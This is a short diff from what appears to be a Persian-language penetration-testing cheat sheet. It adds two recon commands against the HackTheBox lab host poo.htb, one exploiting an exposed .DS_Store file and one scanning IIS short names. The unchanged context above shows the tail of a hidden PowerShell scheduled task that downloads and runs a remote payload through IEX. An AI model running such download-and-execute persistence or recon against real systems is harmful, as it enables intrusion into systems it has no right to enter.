@@ -1341,3 +1341,13 @@ hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object
 net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
 onidle /i 30
 ```
+
+
+## استفاده از فایل های .DS_Store
+
+```text
+1-find structure
+python2.7 ds_store_exp.py http://poo.htb/.DS_Store
+2-enum in finded path 
+java -jar iis_shortname_scanner.jar 2 20 http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/
+```
